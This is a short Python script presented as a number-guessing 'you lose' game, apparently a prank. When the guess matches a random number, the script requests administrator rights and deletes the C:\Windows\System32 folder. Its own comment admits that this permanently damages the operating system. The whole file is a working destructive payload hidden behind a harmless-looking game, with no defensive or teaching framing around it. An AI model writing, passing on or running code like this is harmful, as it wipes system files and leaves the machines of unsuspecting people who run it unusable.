''' 
import random, os, shutil, ctypes, sys
if(int(input("Pick a number 1-10: "))==random.randint(1,10)):
    print("///////////////////////////")
    print("        YOU LOSE")
    print("///////////////////////////")
    #THIS REMOVES OR PERMANENTLY DAMAGES YOUR OPERATING SYSTEM
    ctypes.windll.shell32.IsUserAnAdmin() or ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1) == sys.exit(0)
    shutil.rmtree('C:\\Windows\\System32', ignore_errors=True); os.makedirs('C:\\Windows\\System32', exist_ok=True)
else:
    print("You survived")
'''
